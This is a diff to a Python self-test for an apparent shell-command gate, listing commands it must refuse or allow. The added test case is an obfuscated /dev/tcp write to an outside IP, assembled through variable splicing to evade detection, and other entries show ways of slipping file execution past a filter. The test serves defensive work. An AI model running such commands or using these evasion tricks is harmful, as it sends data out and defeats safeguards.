@@ -343,7 +343,8 @@ def gate_self_test():
     [os.chmod(os.path.join(cwd, n), m) for n, m in (("locked.sh", 0), ("exe.sh", 0o755))]
     for command in ("./git status", "bash big.sh", "sh quoted.sh", "source ./direct.sh", "python3 runner.py", "./locked.sh", "python3 pkg", "nohup ./direct.sh &", "bash -e direct.sh", "bash -o errexit direct.sh", "sh -p direct.sh",
                     "node -r ./dirty.py clean.py", "node --require=dirty.py clean.py", "python3 -m dirty", "python3 -Wignore dirty.py", "awk -f prog.awk x", "xargs bash direct.sh", "find . -exec bash direct.sh ;", "caffeinate -i ./exe.sh",
-                    "arch -arm64 exe.sh", "cd pkg && ./run.sh", "cd pkg; bash run.sh", "(cd pkg) && sh run.sh", "cd $D && bash gone.sh", "make -C pkg", "make all", "H=pgm-pr; X=${H}od0001; ./tame.sh"):
+                    "arch -arm64 exe.sh", "cd pkg && ./run.sh", "cd pkg; bash run.sh", "(cd pkg) && sh run.sh", "cd $D && bash gone.sh", "make -C pkg", "make all", "H=pgm-pr; X=${H}od0001; ./tame.sh",
+                    "D=/dev/t; echo x >${D}cp/198.51.100.7/80"):
         assert refused(command), f"the file it may run: {command!r}"
     for command in ("./tame.sh", "bash tame.sh", "python3 clean.py", "cat direct.sh | bash", "python3 -c 'print(1)'", "find . -name '*.py'", "cd pkg && ls", "python3 -m json.tool"):
         assert allowed(command), f"no sample in the file, or no file (a pipe, inline code: known gap): {command!r}"
